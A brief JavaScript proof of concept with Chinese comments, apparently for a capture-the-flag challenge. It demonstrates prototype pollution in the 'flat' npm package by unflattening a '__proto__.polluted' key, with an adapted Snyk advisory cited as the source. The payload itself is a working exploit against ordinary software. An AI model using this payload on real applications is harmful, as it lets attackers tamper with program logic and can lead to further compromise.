// 概念驗證
// 改寫自 https://security.snyk.io/vuln/SNYK-JS-FLAT-596927
// 記得先執行 `npm install`，或是把這個檔案搬到 ./gunship/challenge/ 底下

const unflatten = require('flat').unflatten;

unflatten({
    '__proto__.polluted': true
});

// true
// 雖然 polluted 沒有定義，但是因爲 polluted 會被解釋成 global.polluted，而這裡的 global 是物件，類似於瀏覽器的 window 物件
console.log(polluted);